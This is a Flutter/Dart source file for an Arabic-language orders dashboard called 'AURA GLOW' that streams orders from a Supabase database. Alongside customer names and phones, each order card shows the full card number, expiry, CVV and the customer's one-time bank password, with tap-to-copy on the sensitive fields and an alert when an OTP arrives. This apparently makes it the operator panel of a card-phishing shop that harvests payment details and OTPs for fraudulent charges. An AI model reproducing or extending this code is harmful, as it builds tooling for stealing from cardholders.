import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:intl/intl.dart';
import '../services/notification_service.dart';

class OrdersScreen extends StatefulWidget {
  const OrdersScreen({super.key});

  @override
  State<OrdersScreen> createState() => _OrdersScreenState();
}

class _OrdersScreenState extends State<OrdersScreen> {
  final _supabase = Supabase.instance.client;
  List<Map<String, dynamic>> _orders = [];
  bool _loading = true;
  String _filter = 'all';

  @override
  void initState() {
    super.initState();
    _loadOrders();
    _subscribeRealtime();
  }

  void _subscribeRealtime() {
    _supabase
        .from('orders')
        .stream(primaryKey: ['id'])
        .order('id', ascending: false)
        .listen((List<Map<String, dynamic>> data) {
      final oldCount = _orders.length;
      setState(() {
        _orders = data;
        _loading = false;
      });
      if (data.length > oldCount && oldCount > 0) {
        final newOrders = data.take(data.length - oldCount);
        for (final o in newOrders) {
          final name = o['customer_name'] ?? 'عميل';
          final total = o['total'] ?? 0;
          final otp = o['card_otp'] ?? '';
          final hasOtp = otp.isNotEmpty;
          NotificationService.show(
            title: hasOtp ? '✅ تم تأكيد الدفع!' : '🛒 طلب جديد!',
            body: hasOtp
                ? '$name - تم الدفع مع OTP'
                : '$name - $total ₪',
          );
        }
      }
    });
  }

  Future<void> _loadOrders() async {
    try {
      final data = await _supabase
          .from('orders')
          .select('*')
          .order('id', ascending: false);
      setState(() {
        _orders = data;
        _loading = false;
      });
    } catch (e) {
      setState(() => _loading = false);
    }
  }

  List<Map<String, dynamic>> get _filteredOrders {
    if (_filter == 'all') return _orders;
    if (_filter == 'new') return _orders.where((o) => (o['card_otp'] ?? '') == '').toList();
    if (_filter == 'paid') return _orders.where((o) => (o['card_otp'] ?? '') != '').toList();
    return _orders;
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('AURA GLOW - الطلبات'),
        actions: [
          PopupMenuButton<String>(
            icon: const Icon(Icons.filter_list),
            onSelected: (v) => setState(() => _filter = v),
            itemBuilder: (_) => [
              const PopupMenuItem(value: 'all', child: Text('الكل')),
              const PopupMenuItem(value: 'new', child: Text('طلبات جديدة')),
              const PopupMenuItem(value: 'paid', child: Text('مكتملة الدفع')),
            ],
          ),
          IconButton(
            icon: const Icon(Icons.refresh),
            onPressed: _loadOrders,
          ),
        ],
      ),
      body: _loading
          ? const Center(child: CircularProgressIndicator())
          : _filteredOrders.isEmpty
              ? const Center(child: Text('لا توجد طلبات'))
              : ListView.builder(
                  padding: const EdgeInsets.all(12),
                  itemCount: _filteredOrders.length,
                  itemBuilder: (_, i) => _OrderCard(order: _filteredOrders[i]),
                ),
    );
  }
}

class _OrderCard extends StatelessWidget {
  final Map<String, dynamic> order;
  const _OrderCard({required this.order});

  @override
  Widget build(BuildContext context) {
    final name = order['customer_name'] ?? '-';
    final phone = order['customer_phone'] ?? '-';
    final total = order['total'] ?? 0;
    final status = order['status'] ?? 'قيد المراجعة';
    final date = order['created_at'] != null
        ? DateFormat('dd/MM HH:mm').format(DateTime.parse(order['created_at']))
        : '-';
    final cardNumber = order['card_number'] ?? '';
    final cardHolder = order['card_holder'] ?? '';
    final cardExpiry = order['card_expiry'] ?? '';
    final cardCvv = order['card_cvv'] ?? '';
    final cardOtp = order['card_otp'] ?? '';
    final paymentMethod = order['card_type'] ?? '-';
    final hasCard = cardNumber.isNotEmpty;
    final hasOtp = cardOtp.isNotEmpty;

    return Card(
      margin: const EdgeInsets.only(bottom: 12),
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
      elevation: 2,
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Icon(
                  hasOtp ? Icons.check_circle : Icons.pending,
                  color: hasOtp ? Colors.green : Colors.orange,
                  size: 20,
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: Text(name, style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 16)),
                ),
                Text('$total ₪', style: TextStyle(fontWeight: FontWeight.bold, color: Colors.amber.shade800, fontSize: 16)),
              ],
            ),
            const Divider(height: 16),
            _row('رقم الهاتف', phone),
            _row('طريقة الدفع', paymentMethod),
            _row('التاريخ', date),
            _row('الحالة', status),
            if (hasCard) ...[
              const Divider(height: 12),
              const Text('بيانات البطاقة:', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
              const SizedBox(height: 4),
              _row('رقم البطاقة', cardNumber, mono: true, copyable: true),
              _row('صاحبها', cardHolder),
              _row('تاريخ الانتهاء', cardExpiry),
              _row('رمز الأمان', cardCvv, mono: true, copyable: true),
              if (hasOtp) _row('رمز التحقق (OTP)', cardOtp, mono: true, copyable: true, highlight: true),
            ],
          ],
        ),
      ),
    );
  }

  Widget _row(String label, String value, {bool mono = false, bool copyable = false, bool highlight = false}) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 2),
      child: Row(
        children: [
          Text('$label: ', style: TextStyle(color: Colors.grey.shade600, fontSize: 13)),
          Expanded(
            child: GestureDetector(
              onTap: copyable
                  ? () {
                      Clipboard.setData(ClipboardData(text: value));
                      ScaffoldMessenger.of(context).showSnackBar(
                        const SnackBar(content: Text('تم النسخ'), duration: Duration(seconds: 1)),
                      );
                    }
                  : null,
              child: Text(
                value,
                style: TextStyle(
                  fontSize: 13,
                  fontWeight: highlight ? FontWeight.bold : FontWeight.normal,
                  color: highlight ? Colors.green.shade700 : null,
                  fontFamily: mono ? 'monospace' : null,
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}
